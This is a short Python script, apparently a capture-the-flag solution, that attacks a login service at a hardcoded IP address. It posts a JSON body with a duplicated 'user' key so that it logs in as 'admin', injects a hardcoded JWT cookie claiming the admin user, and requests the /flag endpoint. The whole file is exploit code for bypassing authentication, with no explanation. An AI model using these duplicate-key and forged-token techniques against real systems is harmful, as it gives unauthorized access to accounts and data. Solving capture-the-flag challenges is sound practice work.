import requests
import json

url = "http://34.131.133.224:9999/login"
data = {
    "user":"ace",
    "pass":"ctf",
    "user":"admin"
}

session = requests.Session();

response = session.post(url, json=data)

# Print the status code and the response text (body)
print("Status Code:", response.status_code)
print("Response Text:", response.text)

#cookieDict = json.loads(response.text)
cookieDict = {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xLtLdUxXsGB7EqP49a8xQziqpjkVKeJ9o2nix4xLf5M"}
session.cookies.update(cookieDict)

response = session.get("http://34.131.133.224:9999", json={})

# Print the status code and the response text (body)
print("Status Code:", response.status_code)
print("Response Text:", response.text)

flag = "http://34.131.133.224:9999/flag"

response = session.post(flag, json=cookieDict)

# Print the status code and the response text (body)
print("Status Code:", response.status_code)
print("Response Text:", response.text)

cookies = session.cookies
for cookie in cookies:
   print(f"{cookie.name}: {cookie.value}")
